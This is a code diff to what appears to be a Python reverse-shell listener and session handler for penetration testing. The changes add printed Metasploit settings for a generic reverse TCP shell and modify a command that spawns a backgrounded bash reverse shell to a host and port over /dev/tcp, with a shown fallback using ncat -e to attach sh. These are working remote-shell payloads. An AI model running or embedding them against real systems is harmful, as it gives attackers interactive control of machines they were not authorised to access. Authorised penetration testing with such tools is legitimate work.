@@ -1152,12 +1152,22 @@ class Listener:
 			ips = [ip for ip in Interfaces().list.values()]
 
 		for ip in ips:
-			output.extend([preset.format(paint(ip).blue,
-				paint(self.port).yellow_DIM) for preset in presets])
+			output.extend(('', '➤  ' + str(paint(ip).CYAN), ''))
+			output.extend([preset.format(ip, port) for preset in presets])
 
-		output.append("─" * len(max(output, key=len)))
+			output.extend(textwrap.dedent(f"""
+			{paint('Metasploit').UNDERLINE}
+			set PAYLOAD generic/shell_reverse_tcp
+			set LHOST {ip}
+			set LPORT {self.port}
+			set DisablePayloadHandler true
+			""").split("\n"))
 
-		return '\r\n'.join(output)
+			output.append("-" * len(max(output, key=len)))
+
+		#output.append("─" * len(max(output, key=len)))
+
+		return f'\r\n'.join(output)
 
 
 class LineBuffer:
@@ -1628,7 +1638,7 @@ class Session:
 					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
 					try:
 						return self.responses.get(timeout=15)#options.short_timeout)
-					except queue.Empty: # TODO temp fix
+					except queue.Empty: # TODO temp fix: this is dangerous as next responses may come out of order
 						return b""
 				return None
 
@@ -2415,7 +2425,8 @@ class Session:
 				if self.bin['bash']:
 					# bash -i doesn't always work
 					# cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
-					cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"'
+					# temp fix, appending 2>&1 because of popen in agent
+					cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'
 
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
@@ -3353,7 +3364,7 @@ def listener_menu(listener):
 	tty.setraw(sys.stdin)
 
 	while True:
-		sys.stdout.write(f"\r\x1b[?25l{paint('➤').cyan} 💀 Show Payloads (p) 🏠 Main Menu (m) 🚫 Quit (q/Ctrl-C)")
+		sys.stdout.write(f"\r\x1b[?25l{paint('➤ ').white} 💀 {paint('Show Payloads').magenta} (p) 🏠 {paint('Main Menu').green} (m) 🚫 {paint('Quit').red} (q/Ctrl-C)")
 		sys.stdout.flush()
 
 		r, _, _ = select.select([sys.stdin, core.control], [], [])
